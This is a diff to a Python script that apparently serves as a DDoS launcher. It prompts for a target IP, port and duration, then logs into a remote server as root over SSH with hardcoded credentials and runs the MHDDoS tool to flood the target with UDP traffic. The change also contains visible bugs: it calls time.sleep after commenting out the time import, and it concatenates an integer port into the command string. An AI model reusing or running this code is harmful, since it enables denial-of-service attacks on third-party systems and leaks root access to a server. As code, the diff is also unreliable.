@@ -4,9 +4,9 @@
 import requests
 import socket
 #import socks
-import time
-import random
-import threading
+#import time
+#import random
+#import threading
 import sys
 import ssl
 import datetime
@@ -67,14 +67,18 @@ if layer4input == "UDP":
     portudp = input(f"port ══ ")
     
     timeudp = input(f"time ══ ")
-    cmdudp = 'screen && cd files/dont_look && python3 start.py UDP ' + ipudp + ':' + portudp + ' ' + '900' + ' ' + timeudp
-    host1 = "surf.ssh"
+    #cmdudp = "screen && cd files/dont_look && python3 start.py UDP ' + ipudp + ':' + portudp + ' ' + '900' + ' ' + timeudp"
+    host1 = "ssh.surf"
     username1 = "root"
-    password1 = "RHE8Y5cqjK"
-    port1 = 8227
+    password1 = "gaaBmc87Yw"
+    port1 = 8238
     client = paramiko.client.SSHClient()
-    client.connect(host1, username=username1, password=password1, port=port1)
-    
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(host1, port=port1, username=username1, password=password1)
+    _stdin, _stdout,_stderr = client.exec_command("cd root && cd MHDDoS && python3 start.py UDP " + ipudp + ":" + port1 + " 900 " + timeudp)
+    print(_stdout.read().decode())
+    time.sleep(5)
+    _stdin.close()
     client.close()
 
 if layer4input == "TCP":
